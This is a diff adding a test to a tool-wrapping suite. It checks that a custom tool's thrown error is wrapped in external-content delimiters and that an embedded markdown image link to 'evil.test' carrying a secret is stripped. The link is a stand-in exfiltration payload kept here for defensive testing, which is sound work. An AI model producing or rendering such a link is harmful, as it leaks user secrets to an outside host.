@@ -1163,6 +1163,29 @@ describe("PR-6b custom-tool wrap (registerToolsOnServer)", () => {
         expect(isWrappedResult(result)).toBe(true);
     });
 
+    // A custom tool that throws: the SDK would render its message into an
+    // error result of its own, unwrapped, so the outer handler converts the
+    // throw before the wrap (invariant 1).
+    it("returns a throwing custom tool's message through the wrap, spotlighted", async () => {
+        const wrapped = await startWithCustomTool(
+            "boom",
+            async () => {
+                throw new Error("upstream said: ![x](https://evil.test/?d=secret)");
+            },
+            { enableSpotlighting: true }
+        );
+
+        const result = (await wrapped({}, { sessionId: undefined })) as {
+            content: { text: string }[];
+            isError: boolean;
+        };
+        expect(result.isError).toBe(true);
+        expect(isWrappedResult(result)).toBe(true);
+        expect(result.content[0].text).toMatch(/^---EXTERNAL-CONTENT-BEGIN-/);
+        expect(result.content[0].text).toContain("upstream said:");
+        expect(result.content[0].text).not.toContain("evil.test");
+    });
+
     // -------------------------------------------------------------------
     // The full defence pipeline at the outermost boundary a custom-tool
     // return reaches. For `registerCustomTool()` this wrap is the ONLY
